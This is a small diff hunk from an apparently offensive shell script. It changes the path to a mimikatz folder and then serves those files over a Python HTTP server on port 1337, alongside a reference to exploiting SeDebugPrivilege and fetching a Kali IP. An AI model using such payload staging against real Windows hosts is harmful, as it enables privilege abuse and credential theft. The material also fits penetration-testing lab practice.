@@ -7,7 +7,7 @@ exploit SeDebugPrivilege permission
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
 
-cd ~/Desktop/base/code/xdotool/scripts/windows/mimikatz/.files
+cd ${SCRIPTS_DIR}/windows/mimikatz/.files
 python3 -m http.server 1337 &
 HTTP_PID=$!
 
